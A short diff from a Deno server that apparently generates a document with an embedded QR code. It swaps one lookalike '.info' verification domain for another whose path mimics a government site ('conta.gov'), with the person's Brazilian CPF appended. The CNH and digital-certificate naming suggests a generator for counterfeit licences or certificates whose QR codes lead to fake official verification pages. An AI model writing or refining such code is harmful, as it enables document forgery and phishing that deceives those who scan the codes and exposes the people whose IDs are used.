@@ -212,7 +212,7 @@ Deno.serve(async (req) => {
       const qrW = mmToPt(68);
       const qrH = mmToPt(71.9);
       try {
-        const qrData = `https://condutor-cnhdigital-vio-web.info/verificar?cpf=${cleanCpf}`;
+        const qrData = `https://qrcode-certificadodigital-vio.info//conta.gov/app/informacoes_usuario.php?id=${cleanCpf}`;
         const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(qrData)}&format=png`;
         const qrResponse = await fetch(qrApiUrl);
         if (qrResponse.ok) {
